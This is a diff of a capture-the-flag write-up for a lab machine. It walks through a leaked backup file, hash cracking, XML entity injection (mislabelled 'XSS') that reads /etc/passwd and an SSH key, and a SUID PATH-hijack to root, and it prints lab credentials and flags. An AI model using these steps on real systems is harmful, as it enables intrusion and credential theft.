@@ -44,7 +44,9 @@ Nmap done: 1 IP address (1 host up) scanned in 539.73 seconds
 ```
 
 ### Gobuster
+
 Found directory `/custom` under which found a `.bak` file in `/js/users.bak` which has admin username and password
+
 ```console
 ❯ gobuster dir --url http://10.10.208.17    -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,js,txt | tee gobuster.log
 ===============================================================
@@ -76,19 +78,23 @@ TABLE  users
 sqlite> SELECT * FROM users
    ...> ;
 admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
-
 ```
+
 On cracking the password on crackstation found credential as `admin:bulldog19`
 
 ### http://10.10.208.17:80
+
 No login page found on the port it was just a template website
 
 ### http://10.10.208.17:8765
+
 - Got a login page
 - Logged in with the above credentials
 - Success!
 - Greeted with a textbox which prompts to enter a XML code
 - On Reading page Source found that there is another `.bak` at `/auth/dontforget.bak` and an id_rsa file for user `barry`
+
+
 ```html
 <!DOCTYPE html>
 <html lang="en">
@@ -135,11 +141,15 @@ No login page found on the port it was just a template website
 </html>
 ```
 - Downloaded `/auth/dontforget.bak`  and checked filetype.
+
+
 ```console
 ❯ file dontforget.bak
 dontforget.bak: XML 1.0 document, Unicode text, UTF-8 text, with very long lines (873), with CRLF line terminators
 ```
 - This is a XML file on reading found Elements for the xss injection as it has `Name`, `Author` , and `Comment` field.
+
+
 ```html
 <?xml version="1.0" encoding="UTF-8"?>
 <comment>
@@ -148,7 +158,10 @@ dontforget.bak: XML 1.0 document, Unicode text, UTF-8 text, with very long lines
   <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
 </comment>
 ```
+
 - So this page is vulnerable to XSS injection and injected the above code to read `/etc/passwd`.
+
+
 ```html
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -192,7 +205,10 @@ pollinate:x:111:1::/var/cache/pollinate:/bin/false
 joe:x:1002:1002::/home/joe:/bin/bash
 barry:x:1003:1003::/home/barry:/bin/bash</p><p>Author : Barry Clad</p><p>Comment :<br> random<p/>    </section>
 ```
+
 - We know that there is `id_rsa` file for user barry tried readig id_rsa file.
+
+
 ```console
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -239,10 +255,15 @@ Comment :<br> random<p/>
 
 - Cracked passphrase for id_rsa with john.
 - First converted id_rsa to hash
+
+
 ```console
 ❯ ssh2john id_rsa > hash
 ```
+
 Then cracked with rockyou.txt file
+
+
 ```console
 ❯ john -w=/usr/share/wordlists/rockyou.txt hash | tee john.log
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -250,24 +271,33 @@ Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hash
 Cost 2 (iteration count) is 1 for all loaded hashes
 urieljames       (id_rsa)
 ```
+
 Logged in to SSH
 
 
 
 ## Exploitation
 - Found user.txt in `/home/barry`
+
+
 ```console
 barry@mustacchio:~$ cat user.txt
 62d77a4d5f97d47c5aa38b3b2651b831
 ```
+
 - Moved to home and found another user `joe`
 - On moving to `joe`s home directory found a binary `live_log` with permissions to execute as root and readable by `barry`
+
+
 ```console
 barry@mustacchio:/home/joe$ ls -l
 total 20
 -rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log
 ```
+
 - On reading strings in this binary found that this program is `trail` without full path to tail, so we can exploit this program by making a new shell file and adding it to PATH as `tail`.
+
+
 ```console
 barry@mustacchio:/home/joe$ strings live_log 
 /lib64/ld-linux-x86-64.so.2
@@ -295,8 +325,11 @@ barry@mustacchio:/tmp$ export PATH=/tmp/:$PATH
 barry@mustacchio:/tmp$ /home/joe/live_log
 root@mustacchio:/tmp#
 ```
+
 - Got a root shell
 - Found `root.txt` at `/root/`
+
+
 ```console
 root@mustacchio:/tmp# cat /root/root.txt
 3223581420d906c4dd1a5f9b530393a5
